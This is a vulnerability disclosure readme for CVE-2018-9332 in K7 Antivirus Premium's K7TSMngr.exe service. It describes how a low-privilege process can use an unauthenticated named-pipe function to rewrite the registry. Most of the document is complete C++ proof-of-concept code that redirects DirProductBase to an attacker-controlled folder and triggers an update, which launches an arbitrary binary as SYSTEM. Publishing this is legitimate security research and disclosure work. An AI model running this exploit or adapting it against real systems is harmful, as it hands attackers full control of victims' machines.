# CVE-2018-9332

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 15.1.0.53* 
* **Component**: *K7TSMngr.exe 16.0.0.70*

# K7TSMngr.exe Pipe Handler Background
*See description in [CVE-2018-8724](../CVE-2018-8724/readme.md)*

# Details
Following on from the background piece above regarding the Pipe, the handler for the function id 0x10044 allows the remote call to perform registry modification from the K7TSMngr.exe service (which runs with SYSTEM integirty). As you can call this from a LOW privileged process, you have good control of the entire registry which makes LPE relatively trivial.

The handler routine eventually calls sub_40C9E0 which is a simple wrapper over sub_41EA90 which is where all the registry interaction occurs.

The PoC code overwrites the value of DirProductBase in the K7â€™s registry key in HKLM/SOFTWARE. This key is used regularly when building up paths of executables to run, such as the process used to check for updates (K7TSHlpr.exe). Once that key is overwritten with a location that can be controlled, the K7TSMngr will look in the new location for this binary and will run it from there. Therefore, we just set the string to something we control, make the appropriate binary, then call pipe with the ID 0x10010, and this triggers an update to occur, this launching our binary as SYSTEM. All of which can be done from a LOW integrity process.

While the PoC demonstrates this via K7's own infrastructure, there are many other keys you can play with to achieve the same effect.

# PoC Code
For this PoC, put the binary you want to launch as SYSTEM (in session 0) in the following path and name it as K7TSHlpr.exe, it doesn't have to be the real one, just have that name:
* C:\\test\\hacked\\K7TSHlpr.exe

```C++
#include <Windows.h>
#include <stdio.h>

#define _CRT_SECURE_NO_WARNINGS

typedef struct _unk1
{
	DWORD dwMagic;
	DWORD dwSomeMagic;
	DWORD dwInSize;
	DWORD field_c;
	DWORD dwFunctionId;
	DWORD dwInputDataSize;
	DWORD dwOutputDataSize;
} unk1;

HANDLE g_hPipe = INVALID_HANDLE_VALUE;

BOOL InitPipe()
{
	g_hPipe = CreateFileA("\\\\.\\pipe\\K7TSMngrService1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (g_hPipe == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileW Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL CallPipeFunction(DWORD dwFunctionId, PBYTE pInput, DWORD dwInSize, PBYTE pOutput, DWORD dwOutSize)
{
	unk1 u1 = { 0 };
	u1.dwMagic = 0x4B375453;
	u1.dwSomeMagic = 0x1010;
	u1.dwInSize = 28;
	u1.dwFunctionId = dwFunctionId;
	u1.dwInputDataSize = dwInSize;

	DWORD dwBytesWritten = 0;
	if (!WriteFile(g_hPipe, &u1, sizeof(u1), &dwBytesWritten, NULL))
	{
		printf("WriteFile 1 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	if (!WriteFile(g_hPipe, pInput, dwInSize, &dwBytesWritten, NULL))
	{
		printf("WriteFile 2 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

//
// This vulnerability demonstrates achieveing SYSTEM runtime via setting arbitary registry key 
// modification by a SYSTEM level process. I have specifically targetted K7 because it 
// demonstrates the point, however there are many placed in the Generate Windows Registry which 
// do the same thing
//
int Vuln_RegistryRewriting_K7UpdateKey()
{
	DWORD dwSize = 0x4000;
	PCHAR pszData = (char*)VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	//
	// Setup our pipe connection
	//
	if (!InitPipe())
	{
		printf("Error: InitPipe failed\r\n");
		return 0;
	}

	//
	// This will modify the following registry key's DirProductBase to point to our hacked path. 
	// This path is completely controllable.
	//
	snprintf(pszData, dwSize, "[%s]\r\n\"%s\"=\"%s\"\r\n", "HKLM\\SOFTWARE\\K7 Computing\\K7TotalSecurity", "DirProductBase", "C:\\test\\hacked");

	//
	// This will perform the actual modification to the registry key via the K7TSMngr service.
	//
	if (!CallPipeFunction(0x10044, (PBYTE)pszData, dwSize, NULL, 0))
	{
		printf("Error: CallPipeFunction failed");
		return 0;
	}

	//
	// This kicks off an update process and will run any binary called K7TSHlpr.exe from the folder 
	// in DirProductBase. Therefore we have just created a process with SYSTEM integrity in Session
	// 0. Fab :)
	//
	InitPipe();
	BYTE data[0x10] = { 0 };
	if (!CallPipeFunction(0x10010, data, sizeof(data), NULL, 0))
	{
		printf("Error: Kicking off an update failed\r\n");
		return 0;
	}

	return 1;
}


int main(int argc, char** argv)
{
    Vuln_RegistryRewriting_K7UpdateKey();
	return 0;
}

```